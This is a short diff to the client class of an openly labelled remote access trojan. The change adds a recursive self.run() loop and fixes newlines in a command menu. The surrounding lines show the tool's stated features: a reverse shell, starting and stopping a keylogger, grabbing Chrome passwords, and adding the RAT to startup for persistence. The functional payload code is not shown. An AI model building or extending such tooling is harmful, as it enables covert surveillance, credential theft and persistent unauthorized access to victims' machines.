@@ -56,6 +56,7 @@ class Client:
         3. Gets a reverse shell from client to server
         """
         
+        
         choice = self.open_menu()
         
         if choice == 1:
@@ -80,6 +81,8 @@ class Client:
         elif choice == 6:
             #ToDo
             pass
+        
+        self.run()
             
             
 
@@ -106,8 +109,8 @@ class Client:
             2) Start keylogger \n \
             3) Stop keylogger \n \
             4) Get chrome passwords \n \
-            5) Add RAT to startup \
-            6) Remove RAT from startup \
+            5) Add RAT to startup \n \
+            6) Remove RAT from startup \n\n \
             \n Choice: "
         
         self.send_data(menu_str)
